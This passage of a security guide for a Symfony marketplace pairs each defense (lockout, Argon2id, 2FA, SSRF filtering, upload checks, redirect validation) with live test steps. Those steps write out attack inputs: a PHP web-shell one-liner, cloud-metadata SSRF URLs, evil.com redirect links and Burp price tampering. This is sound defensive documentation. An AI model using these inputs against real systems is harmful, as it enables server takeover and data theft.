    interval: '15 minutes'
```

`src/EventSubscriber/LoginLockoutSubscriber.php` lines 89-99:
```php
// SECURITY: brute force - count this failure on the account; at 5 the account is locked for 15 minutes.
$user->registerFailedLogin();
$this->em->flush();

// The account just became locked: log it.
if ($user->isLocked()) {
    $this->audit->log(AuditLog::ACCOUNT_LOCKED, [
        'email' => $user->getEmail(),
        'locked_until' => $user->getLockedUntil()?->format(\DATE_ATOM),
    ], $user);
}
```

`src/Entity/User.php` lines 274-284:
```php
public function registerFailedLogin(): void
{
    // One more wrong password.
    ++$this->failedAttempts;

    if ($this->failedAttempts >= self::MAX_FAILED_ATTEMPTS) {
        // SECURITY: lock the account; counter restarts so the next lock needs 5 new failures.
        $this->lockedUntil = new \DateTimeImmutable(self::LOCKOUT_DURATION);
        $this->failedAttempts = 0;
    }
}
```

`src/Security/UserChecker.php` lines 45-54:
```php
// SECURITY: an account blocked by an administrator is refused, whatever the password.
if ($user->isBlocked()) {
    throw new CustomUserMessageAccountStatusException(self::BLOCKED_MESSAGE);
}

// SECURITY: a locked account is rejected BEFORE the password is verified, so an attacker
// can't keep guessing while it is locked, even with the right password (rule 6).
if ($user->isLocked()) {
    throw new CustomUserMessageAccountStatusException(self::LOCKED_MESSAGE);
}
```

`src/EventSubscriber/TwoFactorSubscriber.php` lines 55-64:
```php
// SECURITY: limiter keyed on the ACCOUNT, not the IP or session, so logging in again with the
// password doesn't give the attacker new tries. Runs before the code is checked.
$limit = $this->twoFactorCodeLimiter->create('2fa_'.$event->getToken()->getUserIdentifier())->consume();

if (!$limit->isAccepted()) {
    $this->audit->log(AuditLog::RATE_LIMITED, ['limiter' => '2fa_code'], self::user($event));

    // Turned into an authentication failure by the authenticator: the code isn't even checked.
    throw new CustomUserMessageAuthenticationException('Too many invalid codes. Please wait a few minutes and try again.');
}
```

**How it works.** Two independent locks: Symfony's throttle slows the **IP** (5 tries per email, 25 in total per 15 min), and the account lockout stops the **account** after 5 wrong passwords in a row for 15 minutes, even from many IPs. `UserChecker` runs **before** the password check, so during the lock even the right password is refused. 2FA codes, reset tokens, registration, password change and newsletter all have their own limiter.

**How to test it live**
1. Open `/login`, type `buyer3@shop.test` and a wrong password **5 times**.
2. On the 6th attempt type the **right** password `Password2026!`. Expected: refused with "Too many failed login attempts…" (the throttle or the lockout message).
3. Log in as `admin@shop.test`, open `/admin/security`: buyer3 appears in "Locked accounts", the failed-login chart goes up. `/admin/audit?action=account.locked` shows the event.
4. Unlock buyer3 from `/admin/users/<uuid>` → "Unlock".
5. Burp Intruder on `POST /login` with 20 passwords: after 5 requests every response is the same refusal.

**Related test:** NONE for login lockout / throttling / 2FA limit. Only the cash-order limiter is tested: [tests/Security/CashOnDeliveryTest.php](tests/Security/CashOnDeliveryTest.php#L171) `testCashOrdersAreRateLimitedPerBuyer`. See [Gaps](#gaps-to-fix).

---

## 8. Password storage (Argon2id)

**The attack.** The attacker steals the database and cracks the password hashes offline (GPU).
Example here: a SQL dump of the `user` table is leaked.

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [config/packages/security.yaml](config/packages/security.yaml#L8-L16) | `password_hashers`: argon2id + migrate_from bcrypt | 8-16 |
| [src/Controller/RegistrationController.php](src/Controller/RegistrationController.php#L72-L73) | hash at registration | 72-73 |
| [src/Entity/User.php](src/Entity/User.php#L74-L80) | only the hash is stored | 74-80 |
| [src/Entity/User.php](src/Entity/User.php#L482-L496) | `User::__serialize`: no hash in the session file | 482-496 |
| [src/Security/PasswordPolicy.php](src/Security/PasswordPolicy.php#L29-L43) | 12+ chars, letter, digit, not leaked | 29-43 |

**The defending code**

`config/packages/security.yaml` lines 8-16:
```yaml
# SECURITY (rule 5): Argon2id is set explicitly. In Symfony 7 "auto" picks bcrypt, not Argon2id.
# Argon2id is memory-hard, which makes GPU/ASIC cracking of leaked hashes expensive.
# migrate_from: an old bcrypt hash is re-hashed to Argon2id on the next successful login
# (UserRepository::upgradePassword).
password_hashers:
    Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface:
        algorithm: argon2id
        migrate_from:
            - bcrypt
```

`src/Security/PasswordPolicy.php` lines 33-41:
```php
new Assert\NotBlank(message: 'Please enter a password.'),
// SECURITY: max 4096 because Symfony's hashers reject longer input (prevents DoS through huge passwords).
new Assert\Length(min: self::MIN_LENGTH, max: 4096, minMessage: 'Your password must be at least {{ limit }} characters long.'),
// At least one letter and one digit.
new Assert\Regex(pattern: '/\p{L}/u', message: 'Your password must contain at least one letter.'),
new Assert\Regex(pattern: '/\d/', message: 'Your password must contain at least one number.'),
// SECURITY: rejects passwords that appear in known data breaches (k-anonymity API: only the
// first 5 chars of the SHA-1 are sent). skipOnError keeps registration working offline.
new Assert\NotCompromisedPassword(skipOnError: true),
```

`src/Entity/User.php` lines 486-490:
```php
// SECURITY: store a CRC of the hash in the session instead of the hash itself;
// a password change still invalidates other sessions.
$data["\0".self::class."\0password"] = hash('crc32c', (string) $this->password);
// SECURITY: the TOTP secret never lands in session files; the user is reloaded from the DB on each request.
$data["\0".self::class."\0totpSecret"] = null;
```

**How it works.** Argon2id is slow and memory-hard, with a random salt per user, so cracking a leaked hash costs a lot of time and RAM per guess. The policy refuses short or already-leaked passwords. The hash is not even copied into the session file.

**How to test it live**
1. In phpMyAdmin (XAMPP) open the `user` table, column `password`. Expected: values start with `$argon2id$v=19$m=…`.
2. Two accounts with the same password (`Password2026!`) have **different** hashes (unique salt).
3. Register with password `password1234`. Expected: "This password has been leaked in a data breach…" (needs Internet).

**Related test:** NONE (no test checks the hash format). See [Gaps](#gaps-to-fix).

---

## 9. 2FA TOTP

**The attack.** The attacker has the password (phishing, leak, reuse) and logs in.
Example here: `seller1`'s password is leaked; without 2FA the attacker can change the IBAN for payouts.

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [config/packages/security.yaml](config/packages/security.yaml#L63-L74) | `two_factor` on the firewall (+ CSRF) | 63-74 |
| [config/packages/security.yaml](config/packages/security.yaml#L104-L105) | `/2fa` is the only page for a half-logged user | 104-105 |
| [config/packages/scheb_2fa.yaml](config/packages/scheb_2fa.yaml#L7-L18) | code replay protection, leeway 1 | 7-18 |
| [src/Controller/SecuritySettingsController.php](src/Controller/SecuritySettingsController.php#L94-L155) | `start` / `confirm`: enable only after a valid code | 94-155 |
| [src/Controller/SecuritySettingsController.php](src/Controller/SecuritySettingsController.php#L193-L200) | `disable`: needs password AND code | 193-200 |
| [src/Controller/SecuritySettingsController.php](src/Controller/SecuritySettingsController.php#L73-L77) | QR code built server side | 73-77 |
| [src/EventSubscriber/TwoFactorSubscriber.php](src/EventSubscriber/TwoFactorSubscriber.php#L53-L77) | rate limit + logging of code attempts | 53-77 |
| [src/Entity/User.php](src/Entity/User.php#L389-L397) | RFC 6238 config (SHA1, 30 s, 6 digits) | 389-397 |

**The defending code**

`config/packages/scheb_2fa.yaml` lines 7-18:
```yaml
# SECURITY (rule 5): a TOTP code that was already used is rejected (replay protection),
# e.g. a code shoulder-surfed or captured by a phishing proxy can't be used a second time.
code_reuse_cache: cache.app
code_reuse_cache_duration: 90

totp:
    enabled: true
    issuer: 'Secure Marketplace'
    server_name: 'Secure Marketplace'
    # 1 step (30 s) of clock drift tolerated, no more: a wider window makes guessing easier.
    leeway: 1
    template: security/2fa_form.html.twig
```

`src/Controller/SecuritySettingsController.php` lines 193-200:
```php
// SECURITY: re-authentication with BOTH factors. A stolen session (XSS, unlocked computer) is not
// enough to remove 2FA from the account.
if (!$passwordHasher->isPasswordValid($user, $password) || null === $code || !$this->totp->checkCode($user, $code)) {
    $this->audit->log(AuditLog::TWO_FA_FAILURE, ['context' => 'disable_rejected']);
    $this->addFlash('error', 'Wrong password or code. Two-factor authentication is still enabled.');

    return $this->redirectToRoute('app_security_settings');
}
```

`src/Controller/SecuritySettingsController.php` lines 103-105:
```php
// SECURITY: the candidate secret lives only in the server-side session until the user proves they
// scanned it correctly. 2FA is never enabled with a secret the user can't use (no self-lockout).
$request->getSession()->set(self::PENDING_SECRET_KEY, $this->totp->generateSecret());
```

**How it works.** After a correct password the user only holds a "2FA in progress" token: every page except `/2fa` refuses him until a valid 6-digit code is typed. Codes are limited to 5 tries per 5 minutes per account, a used code can't be replayed, and turning 2FA off needs the password **and** a fresh code.

**How to test it live**
1. Log in as `seller1@shop.test`, open `/account/security`, click "Enable", scan the QR code with Google Authenticator, type the code. Expected: "Two-factor authentication is now enabled".
2. Log out, log in again with the password. Expected: redirect to `/2fa`.
3. While on `/2fa`, type `https://127.0.0.1:8000/seller` in the address bar. Expected: back to the code form (not the dashboard).
4. Type 6 wrong codes. Expected: "Too many invalid codes. Please wait a few minutes and try again."
5. As admin, `/admin/audit?action=2fa.failure` shows the failed codes.

**Related test:** NONE. See [Gaps](#gaps-to-fix).

---

## 10. User enumeration (login + password reset)

**Status: PARTIAL.** Login (wrong password) and "forgot password" don't reveal if an email exists. But three places still do (see the end of this section).

**The attack.** The attacker learns which emails have an account, then targets them with phishing or brute force.
Example here: typing `ceo@company.com` on "Forgot password" and seeing "no account with this email".

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [src/Controller/SecurityController.php](src/Controller/SecurityController.php#L37-L43) | `SecurityController::login`: generic error | 37-43 |
| [src/Controller/ResetPasswordController.php](src/Controller/ResetPasswordController.php#L90-L99) | `ResetPasswordController::request`: same page always | 90-99 |
| [src/Controller/ResetPasswordController.php](src/Controller/ResetPasswordController.php#L198-L208) | throttled request silently ignored | 198-208 |
| [src/Controller/NewsletterController.php](src/Controller/NewsletterController.php#L93-L94) | same message if already subscribed | 93-94 |
| [src/EventSubscriber/LoginLockoutSubscriber.php](src/EventSubscriber/LoginLockoutSubscriber.php#L81-L82) | unknown emails are logged, nothing shown | 81-82 |

**The defending code**

`src/Controller/ResetPasswordController.php` lines 90-99:
```php
// Send the email only when the account exists...
if ($user instanceof User) {
    $this->sendResetEmail($user, $mailer, $mailerFrom);
}

// SECURITY: user enumeration. Same redirect and same page whether or not the email exists,
// and whether or not the per-account throttle was hit.
$this->setCanCheckEmailInSession();

return $this->redirectToRoute('app_check_email');
```

`src/Controller/SecurityController.php` lines 37-43:
```php
return $this->render('security/login.html.twig', [
    // The email typed last time (to refill the field) and the error of the last failed attempt.
    // SECURITY: user enumeration - the error is always the generic "Invalid credentials", whether the
    // email exists or not.
    'last_username' => $authenticationUtils->getLastUsername(),
    'error' => $authenticationUtils->getLastAuthenticationError(),
]);
```

**How it works.** For a wrong password and for an unknown email the login shows the same "Invalid credentials." (Symfony hides "user not found" by default). The reset form always redirects to the same "If an account exists, an email was sent" page.

**How to test it live**
1. `/login` with `buyer1@shop.test` + wrong password, then `nobody@shop.test` + wrong password. Expected: the same message both times.
2. `/reset-password` with `buyer1@shop.test`, then with `nobody@shop.test`. Expected: the same page both times. Only buyer1 receives a mail in Mailpit (`http://localhost:8025`).

**What is still missing (PARTIAL)**
- **Registration** says "This email address is already registered." → [src/Entity/User.php](src/Entity/User.php#L37) line 37 (`UniqueEntity` message). Anyone can test an email on `/register` (only limited by 5 per hour per IP, and only *after* the form is valid).
- **Locked / blocked accounts** show a special message ("Too many failed login attempts…" / "This account has been blocked…") → [src/Security/UserChecker.php](src/Security/UserChecker.php#L23-L24) lines 23-24 and 46-54. An unknown email never shows it, so 5 wrong tries reveal that the account exists.
- **Timing**: on reset, the mail is only built and sent when the account exists (lines 91-93), so the response can be slower for real accounts.

**Related test:** NONE. See [Gaps](#gaps-to-fix).

---

## 11. Price tampering + stock race condition

**The attack.** (a) The buyer changes the price in the request to pay less. (b) Two buyers buy the last unit at the same moment and the stock goes negative.
Example here: in Burp, change `price=120.000` to `price=0.010` on "Add to cart", or add `checkout_form[total]=0.01` on checkout.

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [src/Service/CheckoutService.php](src/Service/CheckoutService.php#L59-L75) | `CheckoutService::placeOrder`: no price parameter | 59-75 |
| [src/Service/CheckoutService.php](src/Service/CheckoutService.php#L91-L158) | one transaction (`wrapInTransaction`) | 91-158 |
| [src/Service/CheckoutService.php](src/Service/CheckoutService.php#L184-L202) | `lockProducts`: `SELECT … FOR UPDATE` + refresh | 184-202 |
| [src/Service/CheckoutService.php](src/Service/CheckoutService.php#L131-L139) | stock check on the locked row | 131-139 |
| [src/Entity/OrderItem.php](src/Entity/OrderItem.php#L89-L101) | `OrderItem::__construct`: price snapshot from DB | 89-101 |
| [src/Entity/Order.php](src/Entity/Order.php#L169-L178) | `Order::addItem`: total computed with bcadd | 169-178 |
| [src/Entity/Product.php](src/Entity/Product.php#L273-L285) | `Product::decreaseStock`: never negative | 273-285 |
| [src/Form/CheckoutFormType.php](src/Form/CheckoutFormType.php#L22-L25) | no price/total field | 22-25 |
| [src/Controller/CheckoutController.php](src/Controller/CheckoutController.php#L288-L295) | one-time payment token (no double order) | 288-295 |
| [src/Controller/CartController.php](src/Controller/CartController.php#L151-L159) | quantity 1..99 only | 151-159 |

**The defending code**

`src/Service/CheckoutService.php` lines 191-202:
```php
$rows = $this->em->createQueryBuilder()
    ->select('p')
    ->from(Product::class, 'p')
    ->where('p.id IN (:ids)')
    ->setParameter('ids', $ids)
    ->orderBy('p.id', 'ASC')
    ->getQuery()
    // SECURITY: SELECT ... FOR UPDATE: other checkouts of the same products wait until we commit.
    ->setLockMode(LockMode::PESSIMISTIC_WRITE)
    // Products already loaded with the cart are REFRESHED with the locked values (fresh price and stock).
    ->setHint(Query::HINT_REFRESH, true)
    ->getResult();
```

`src/Service/CheckoutService.php` lines 131-139:
```php
// SECURITY: overselling - not enough stock: stop. Checked on the locked row, so the value cannot change now.
if ($product->getStock() < $quantity) {
    throw new CheckoutException(sprintf('Only %d unit(s) of "%s" left in stock. Please update your cart.', $product->getStock(), $product->getName()));
}

// Stock decremented on the LOCKED row (reserved the same way for card and cash orders).
$product->decreaseStock($quantity);
// SECURITY (rule 10): unit price copied from the locked DB row.
$item = new OrderItem($order, $product, $quantity);
```

`src/Entity/OrderItem.php` lines 97-100:
```php
$this->productName = $product->getName();
// SECURITY (rule 10): the price comes from the locked product row, never from the request.
$this->unitPrice = $product->getPrice();
$this->quantity = $quantity;
```

`src/Controller/CheckoutController.php` lines 288-295:
```php
// SECURITY: the payment token must match the one issued to THIS session (constant-time comparison).
if (null === $address || null === $payment || !hash_equals($payment['token'], $request->request->getString('payment_token'))) {
    $this->addFlash('error', 'Your payment session has expired. Please choose your payment method again.');

    return $this->redirectToRoute(null === $address ? 'checkout' : 'checkout_payment');
}
// SECURITY: single use. Removed BEFORE placing the order, so a double submit can't create two orders.
$session->remove(self::SESSION_PAYMENT);
```

**How it works.** No price, total or product list ever comes from the browser: `placeOrder()` only takes the buyer, the address and the payment method. Inside one DB transaction the products are locked (`FOR UPDATE`) and re-read, so the price and stock are fresh and can't change until commit. A second buyer for the last unit waits for the lock, then sees stock 0 and gets an error; any error rolls everything back.

**How to test it live**
1. Log in as `buyer1@shop.test`, open a product, click "Add to cart" with Burp on. Add `&price=0.01&unitPrice=0.01` to the body. Expected: the cart and the order use the real database price.
2. Go to `/checkout/payment`, fill the card (`4242 4242 4242 4242`, `12/30`, `123`), intercept and add `checkout_form[total]=0.01`. Expected: **422**, "This form should not contain extra fields".
3. Race: set a product's stock to 1 (as its seller), put it in the carts of `buyer1` and `buyer2` (two browsers), click "Place order" in both at the same time. Expected: one order succeeds, the other gets "Only 0 unit(s) … left in stock". Stock is 0, never -1.
4. Replay: in Burp, repeat the final `POST /checkout/place`. Expected: "Your payment session has expired" (token already used), no second order.

**Related test:** [tests/Security/CheckoutPriceTamperingTest.php](tests/Security/CheckoutPriceTamperingTest.php): `testExtraPriceFieldInThePaymentFormIsRejected` (line 18), `testClientPriceIsIgnoredAndTheOrderUsesDatabasePrices` (38). No automated race-condition test.

---

## 12. Malicious file upload

**The attack.** The attacker uploads a file that runs code on the server (web shell) or in the browser (HTML/SVG with JS).
Example here: a seller uploads `shell.php` renamed `shell.jpg`, or `cat.php.jpg`, or a JPEG with PHP code hidden in the EXIF.

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [src/Service/ImageStorage.php](src/Service/ImageStorage.php#L19-L30) | the 6 checks (class comment) | 19-30 |
| [src/Service/ImageStorage.php](src/Service/ImageStorage.php#L88-L147) | `ImageStorage::validateAndStore` | 88-147 |
| [src/Service/ImageStorage.php](src/Service/ImageStorage.php#L166-L180) | `getPath` / `isValidFilename`: no path traversal | 166-180 |
| [config/services.yaml](config/services.yaml#L12-L13) | upload dir outside `public/` | 12-13 |
| [src/Controller/MediaController.php](src/Controller/MediaController.php#L34-L57) | `MediaController::product`: served by a controller | 34-57 |
| [src/Controller/Seller/ProductController.php](src/Controller/Seller/ProductController.php#L251-L263) | max 4 images, all through ImageStorage | 251-263 |
| [src/Controller/Seller/ProductController.php](src/Controller/Seller/ProductController.php#L277-L284) | refused file is audit-logged | 277-284 |
| [src/Controller/Seller/ShopController.php](src/Controller/Seller/ShopController.php#L78) | shop logo uses the same pipeline | 78 |

**The defending code**

`src/Service/ImageStorage.php` lines 96-108:
```php
// 2-3. SECURITY: real MIME from the bytes (magic numbers). A "shell.php" renamed "cat.jpg" is text/x-php here.
$mime = (new \finfo(\FILEINFO_MIME_TYPE))->file($tmpPath);
if (!is_string($mime) || !isset(self::ALLOWED[$mime])) {
    throw new ImageRejectedException(sprintf('File type "%s" is not allowed. Use JPG, PNG or WebP.', is_string($mime) ? $mime : 'unknown'));
}
// Type and extension that go with the detected MIME type.
[$expectedType, $extension] = self::ALLOWED[$mime];

// 4. SECURITY: the image header must parse and match the detected type.
$info = @getimagesize($tmpPath);
if (false === $info || $info[2] !== $expectedType) {
    throw new ImageRejectedException('The file is not a valid image.');
}
```

`src/Service/ImageStorage.php` lines 115-127:
```php
// 5. SECURITY: decode + re-encode. Anything that isn't pixel data is thrown away.
$image = match ($expectedType) {
    \IMAGETYPE_JPEG => @imagecreatefromjpeg($tmpPath),
    \IMAGETYPE_PNG => @imagecreatefrompng($tmpPath),
    \IMAGETYPE_WEBP => @imagecreatefromwebp($tmpPath),
};
if (false === $image) {
    throw new ImageRejectedException('The image could not be decoded.');
}

// 6. SECURITY: random name, extension derived from the detected type, never from the client's filename
// (no path traversal "../../", no ".php", no double extension "x.php.jpg").
$filename = bin2hex(random_bytes(16)).'.'.$extension;
```

`src/Controller/MediaController.php` lines 34-52:
```php
// SECURITY: strict filename regex in the route itself: only "<32 hex>.(jpg|png|webp)" can match, so
// "../../.env", "x.php" or any path separator never reaches the code (path traversal).
#[Route('/media/product/{filename}', name: 'media_product', methods: ['GET'], requirements: ['filename' => ImageStorage::FILENAME_PATTERN])]
...
// SECURITY: Content-Type fixed from our own whitelist, never guessed from the content.
$response->headers->set('Content-Type', ImageStorage::mimeForFilename($filename));
// SECURITY: the browser must not sniff it into HTML/JS.
$response->headers->set('X-Content-Type-Options', 'nosniff');
// SECURITY: even if opened directly, nothing in it can run (no scripts, no plugins, sandboxed).
$response->headers->set('Content-Security-Policy', "default-src 'none'; img-src 'self'; style-src 'unsafe-inline'; sandbox");
```

**How it works.** The type is read from the file **bytes**, not from the name or the browser's Content-Type, and only JPEG/PNG/WebP up to 2 MB pass. The image is decoded and **re-encoded**, so hidden PHP/HTML/EXIF is dropped. It is saved under a random name in `var/uploads/products` (outside `public/`, so Apache can never execute it) and served by `MediaController` with a fixed type, `nosniff` and a sandbox CSP.

**How to test it live**
1. Create `shell.jpg` containing `<?php system($_GET['c']); ?>`. Log in as `seller1@shop.test`, `/seller/products/new`, upload it. Expected: **"File type "text/x-php" is not allowed. Use JPG, PNG or WebP."**
2. Upload a 5 MB photo. Expected: "The image must be smaller than 2 MB."
3. Upload a real JPEG; right-click → "Open image in new tab". Expected URL `/media/product/<32 hex>.jpg`, not your file name.
4. Try `https://127.0.0.1:8000/media/product/../../.env`. Expected: **404**.
5. As admin, `/admin/security` → "Blocked uploads" shows the refused file with seller1's name.

**Related test:** NONE. See [Gaps](#gaps-to-fix).

---

## 13. SSRF (import image from URL)

**The attack.** The server downloads a URL chosen by the user, so the attacker makes it call internal addresses.
Example here: a seller types `http://169.254.169.254/latest/meta-data/` (cloud credentials) or `https://127.0.0.1:3306` in "Import image from URL".

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [src/Service/SafeImageFetcher.php](src/Service/SafeImageFetcher.php#L19-L36) | the 7 defenses (class comment) | 19-36 |
| [src/Service/SafeImageFetcher.php](src/Service/SafeImageFetcher.php#L111-L166) | `SafeImageFetcher::validateUrl` | 111-166 |
| [src/Service/SafeImageFetcher.php](src/Service/SafeImageFetcher.php#L173-L180) | `isPublicIp`: blocked ranges | 173-180 |
| [src/Service/SafeImageFetcher.php](src/Service/SafeImageFetcher.php#L223-L280) | `download`: pinned IP, no redirect, timeout, 2 MB | 223-280 |
| [src/Service/SafeImageFetcher.php](src/Service/SafeImageFetcher.php#L67-L68) | `NoPrivateNetworkHttpClient` (defense in depth) | 67-68 |
| [src/Controller/Seller/ProductController.php](src/Controller/Seller/ProductController.php#L265-L276) | call + audit log `ssrf.blocked` | 265-276 |
| [src/Exception/SsrfBlockedException.php](src/Exception/SsrfBlockedException.php#L12-L25) | generic message to the user | 12-25 |

**The defending code**

`src/Service/SafeImageFetcher.php` lines 124-135:
```php
// SECURITY: https only. Blocks http://, file://, gopher://, ftp://, dict://, php://...
if ('https' !== strtolower($parts['scheme'])) {
    throw new SsrfBlockedException('scheme_not_https', 'Only https:// URLs are allowed.');
}
// SECURITY: credentials in URLs are a classic parser-confusion trick (https://good.com@evil.com).
if (isset($parts['user']) || isset($parts['pass'])) {
    throw new SsrfBlockedException('userinfo_in_url');
}
// SECURITY: standard port only, otherwise the feature becomes a port scanner (https://host:22).
if (isset($parts['port']) && 443 !== $parts['port']) {
    throw new SsrfBlockedException('non_standard_port');
}
```

`src/Service/SafeImageFetcher.php` lines 153-165:
```php
// Ask the DNS for the addresses of this host.
$ips = $this->resolve($host);
if ([] === $ips) {
    throw new SsrfBlockedException('dns_resolution_failed', 'This host could not be resolved.');
}

// SECURITY: ALL addresses must be public, otherwise the client could pick the private one.
foreach ($ips as $ip) {
    $this->assertPublicIp($ip);
}

// Return the first address: the download will connect to exactly this one.
return [$host, $ips[0]];
```

`src/Service/SafeImageFetcher.php` lines 173-180:
```php
public static function isPublicIp(string $ip): bool
{
    if (false === filter_var($ip, \FILTER_VALIDATE_IP)) {
        return false;
    }

    return !IpUtils::checkIp($ip, array_merge(IpUtils::PRIVATE_SUBNETS, self::EXTRA_BLOCKED));
}
```

`src/Service/SafeImageFetcher.php` lines 231-240:
```php
$response = $this->client->request('GET', $url, [
    // SECURITY: connect to the validated IP only (anti DNS rebinding). TLS is still checked
    // against the hostname, so the certificate must be valid for $host.
    'resolve' => [$host => $ip],
    // SECURITY: no redirects at all.
    'max_redirects' => 0,
    // Time limits, and normal TLS certificate checks.
    'timeout' => self::TIMEOUT,
    'max_duration' => self::TIMEOUT,
    'verify_peer' => true,
```

**How it works.** Only `https` on port 443, no `user:pass@`. The host is resolved and **every** IP must be public (Symfony's private list: 127/8, 10/8, 172.16/12, 192.168/16, 169.254/16, ::1, fc00::/7… plus multicast, NAT64). The download is pinned to the IP that was checked (no DNS rebinding), redirects are refused, and there is a 5 s timeout and a 2 MB cap. The downloaded file then goes through the same upload checks (section 12).

**How to test it live** (log in as `seller1@shop.test`, `/seller/products/new`, field "Import image from URL")
1. `http://example.com/a.jpg`. Expected: "Only https:// URLs are allowed."
2. `https://127.0.0.1/a.jpg`. Expected: "This URL is not allowed."
3. `https://169.254.169.254/latest/meta-data/`. Expected: "This URL is not allowed."
4. `https://2130706433/` (127.0.0.1 in decimal). Expected: "This URL is not allowed."
5. `https://example.com:22/`. Expected: "This URL is not allowed."
6. As admin, `/admin/security` → "Blocked SSRF" and `/admin/audit?action=ssrf.blocked`: each attempt with the internal reason (`private_ip:127.0.0.1`, `scheme_not_https`…).

**Related test:** NONE. See [Gaps](#gaps-to-fix).

---

## 14. Open redirect (_target_path)

**The attack.** A link to our site redirects the victim to a fake site after login (phishing looks trustworthy).
Example here: `https://127.0.0.1:8000/login?_target_path=https://evil.com/fake-login`.

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [src/Security/SafeRedirect.php](src/Security/SafeRedirect.php#L28-L55) | `SafeRedirect::isSafePath` | 28-55 |
| [src/Security/LoginSuccessHandler.php](src/Security/LoginSuccessHandler.php#L113-L131) | `LoginSuccessHandler::readTarget` | 113-131 |
| [src/Security/LoginSuccessHandler.php](src/Security/LoginSuccessHandler.php#L76-L79) | re-check before redirect (also after 2FA) | 76-79 |
| [config/packages/security.yaml](config/packages/security.yaml#L51-L55) | custom success handler, `use_referer: false` | 51-55 |
| [src/Controller/WishlistController.php](src/Controller/WishlistController.php#L82-L85) | `_back` field checked | 82-85 |
| [src/Controller/NewsletterController.php](src/Controller/NewsletterController.php#L54-L56) | `_back` field checked | 54-56 |
| [src/Controller/OrderController.php](src/Controller/OrderController.php#L172-L177) | fixed set of destinations | 172-177 |

**The defending code**

`src/Security/SafeRedirect.php` lines 28-55:
```php
public static function isSafePath(?string $target): bool
{
    if (null === $target || '' === $target || strlen($target) > 2048) { return false; }
    // SECURITY: must be an absolute PATH on this site, not a URL.
    if ('/' !== $target[0]) { return false; }
    // SECURITY: "//host" and "/\host" are protocol-relative URLs in browsers -> external site.
    if (isset($target[1]) && ('/' === $target[1] || '\\' === $target[1])) { return false; }
    // SECURITY: backslashes are normalised to "/" by some browsers; control chars enable header injection.
    if (str_contains($target, '\\') || 1 === preg_match('/[\x00-\x1F\x7F]/', $target)) { return false; }
    $parts = parse_url($target);
    // SECURITY: a path must never parse to a scheme or a host.
    return false !== $parts && !isset($parts['scheme']) && !isset($parts['host']);
}
```
(The `if` blocks are written on several lines in the file; they are put on one line here to stay short.)

`src/Security/LoginSuccessHandler.php` lines 128-130:
```php
// SECURITY: open redirect - a link like /login?_target_path=https://evil.com is ignored, because only paths
// inside this site pass isSafePath(). The victim can never be sent to a fake site after logging in.
return SafeRedirect::isSafePath($target) ? $target : null;
```

**How it works.** Only a path that starts with one `/` and has no scheme, host, backslash or control character is accepted. Anything else (`https://evil.com`, `//evil.com`, `/\evil.com`, `javascript:`) is ignored and the user goes to their own dashboard. Other "go back" fields either use `isSafePath()` or a fixed list of route names.

**How to test it live**
1. Log out. Open `https://127.0.0.1:8000/login?_target_path=https://evil.com`, log in as `buyer1@shop.test`. Expected: you land on `/buyer` (your dashboard), not evil.com.
2. Same with `_target_path=//evil.com` and `_target_path=/\evil.com`. Expected: `/buyer`.
3. Control: `_target_path=/buyer/orders`. Expected: you land on `/buyer/orders`.

**Related test:** NONE. See [Gaps](#gaps-to-fix).

---

## 15. Clickjacking

**The attack.** The attacker shows our site in an invisible `<iframe>` on top of a fake button, so the victim clicks "Delete" or "Place order" without knowing.
Example here: `evil.com` frames `/seller/products` with opacity 0.

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [config/packages/nelmio_security.yaml](config/packages/nelmio_security.yaml#L3-L6) | `X-Frame-Options: DENY` | 3-6 |
| [config/packages/nelmio_security.yaml](config/packages/nelmio_security.yaml#L52) | CSP `frame-ancestors 'none'` | 52 |

**The defending code**

`config/packages/nelmio_security.yaml` lines 3-6 and 52:
```yaml
# Clickjacking: the site can never be displayed in a frame (legacy header; CSP frame-ancestors below too).
clickjacking:
    paths:
        '^/.*': DENY
...
            frame-ancestors: ["'none'"]
```

**How it works.** Both headers tell the browser to never show any page of the site inside a frame, on any other site (and not even on itself). Old browsers read `X-Frame-Options`, new ones read `frame-ancestors`.

**How to test it live**
1. Save this as `C:\temp\frame.html` and open it in the browser: `<iframe src="https://127.0.0.1:8000/login" width=800 height=600></iframe>`.
   Expected: empty frame; the console shows "Refused to display … in a frame because it set 'X-Frame-Options' to 'deny'".
2. DevTools → Network → any page: `X-Frame-Options: DENY` and `frame-ancestors 'none'` in the CSP.

**Related test:** NONE (headers are not tested). See [Gaps](#gaps-to-fix).

---

## 16. Sensitive data (IBAN encryption, card data, secrets)

**The attack.** The attacker gets a database dump, a backup, a session file or the Git repository and reads bank data, cards or keys.
Example here: a dump of `user.iban_encrypted`, or the `APP_SECRET` found in GitHub.

**Where the defense is**

| Location | Class::method | Lines |
|---|---|---|
| [src/Service/FieldEncryptor.php](src/Service/FieldEncryptor.php#L14-L28) | libsodium secretbox (design) | 14-28 |
| [src/Service/FieldEncryptor.php](src/Service/FieldEncryptor.php#L52-L64) | `FieldEncryptor::encrypt` | 52-64 |
| [src/Service/FieldEncryptor.php](src/Service/FieldEncryptor.php#L105-L113) | `key()`: fail closed without a 256-bit key | 105-113 |
| [src/Controller/Seller/ShopController.php](src/Controller/Seller/ShopController.php#L133-L134) | IBAN encrypted before it touches the entity | 133-134 |
| [src/Controller/Seller/ShopController.php](src/Controller/Seller/ShopController.php#L162-L170) | only masked IBAN shown, page not cached | 162-170 |
| [src/Entity/User.php](src/Entity/User.php#L111-L117) | `ibanEncrypted` + `ibanLast4` columns | 111-117 |
| [src/Entity/Order.php](src/Entity/Order.php#L102-L105) | only last 4 card digits stored | 102-105 |
| [src/Dto/PaymentDto.php](src/Dto/PaymentDto.php#L52-L55) | CVV never stored | 52-55 |
| [src/Dto/PaymentDto.php](src/Dto/PaymentDto.php#L136-L144) | `__debugInfo`: masked if dumped | 136-144 |
| [src/Controller/CheckoutController.php](src/Controller/CheckoutController.php#L211-L221) | simulated tokenisation, card wiped | 211-221 |
| [.gitignore](.gitignore) | `.env.local`, prod decrypt key ignored | `/.env.local`, `/config/secrets/prod/prod.decrypt.private.php` |
